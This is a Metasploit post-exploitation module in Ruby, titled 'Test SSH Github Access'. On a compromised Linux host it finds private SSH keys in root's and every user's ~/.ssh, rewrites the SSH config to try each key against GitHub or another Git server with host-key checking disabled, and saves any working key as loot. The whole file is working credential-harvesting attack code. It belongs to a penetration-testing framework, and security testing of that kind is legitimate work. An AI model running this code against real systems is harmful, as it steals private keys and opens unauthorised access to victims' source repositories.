##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Test SSH Github Access',
        'Description'   => %q(
          This module will attempt to test remote Git access using
          (.ssh/id_* private keys) found on a system.
        ),
        'License'       => MSF_LICENSE,
        'Author'        => ['Wyatt Dahlenburg (@wdahlenb)'],
        'Platform'      => ['linux'],
        'SessionTypes'  => ['shell', 'meterpreter'],
        'References'    => [['URL', 'https://help.github.com/en/articles/testing-your-ssh-connection']]
      )
    )
    register_options(
      [
        OptString.new('GITSERVER', [false, 'Optional parameter to specify alternate Git Server (GitHub, GitLab, etc)', 'github.com'])
      ]
    )
  end

  def get_private_keys(cmd_output)
    private_keys = []

    return [] if cmd_output.include? 'No such file or directory'

    items = cmd_output.split("\n")
    items.each do |key|
      private_keys << key unless key.ends_with? '.pub'
    end
    private_keys
  end

  def find_ssh_keys
    key_locations = []
    # Check if we have uid 0
    if is_root?
      key_locations << get_private_keys(cmd_exec('ls /root/.ssh/id*'))
      key_locations <<  get_private_keys(cmd_exec('ls /home/*/.ssh/id*'))
    # Otherwise just use the users account
    else
      key_locations <<  get_private_keys(cmd_exec("ls ~/.ssh/id*"))
    end
    key_locations.compact.reduce([], :|)
  end

  def check_key(key)
    results = []
    vprint_status("Checking #{key}")
    # Check if .ssh/config already exists. If so back it up
    config_exists = false
    if !cmd_exec('ls ~/.ssh/config').include? 'No such file or directory'
      config_exists = true
      cmd_exec('cp ~/.ssh/config ~/.ssh/config_bak')
    end
    begin
      # Write new config
      config_contents = "Host gitserver\n\tUser git\n\tHostname #{datastore['GITSERVER']}\n\tPreferredAuthentications publickey\n\tIdentityFile #{key}\n"
      if is_root?
        write_file('/root/.ssh/config', config_contents)
      else
        username = cmd_exec('whoami')
        write_file("/home/#{username}/.ssh/config", config_contents)
      end

      cmd_output = cmd_exec('ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T git@gitserver')
      if cmd_output.include? "\n"
        cmd_output = cmd_output.split("\n")[-1]
      end
      user = provide_user(cmd_output)
      if user
        results = [ key, user, session.sid ]
        save_key(key, user)
      end
    ensure
      # Delete .ssh/config
      cmd_exec('rm -f ~/.ssh/config')
      if config_exists
        cmd_exec("mv ~/.ssh/config_bak ~/.ssh/config")
      end
    end
    results
  end

  def provide_user(output)
    vprint_status("SSH Test: #{output}")
    if output.include? 'successfully authenticated'
      return output.split[1].delete_suffix('!')
    elsif output.include? 'GitLab'
      return output.split[3].delete_suffix('!')
    end
  end

  def save_key(key, _name, ctype = 'text/plain')
    data = read_file(key)
    ltype = "ssh.git.privatekey"
    loot = store_loot(ltype, ctype, session, data, nil, key)
    print_good("#{key} stored in #{loot}")
  end

  def run
    keys_location = find_ssh_keys
    return if keys_location.empty?

    keys_table = Rex::Text::Table.new(
      'Header' => "Git Access Data",
      'Columns' => [ 'Key Location', 'User Access', 'Session' ]
    )

    keys_location.each do |key|
      results = check_key(key)
      keys_table << results unless results.empty?
    end

    print_line(keys_table.to_s)
  end
end
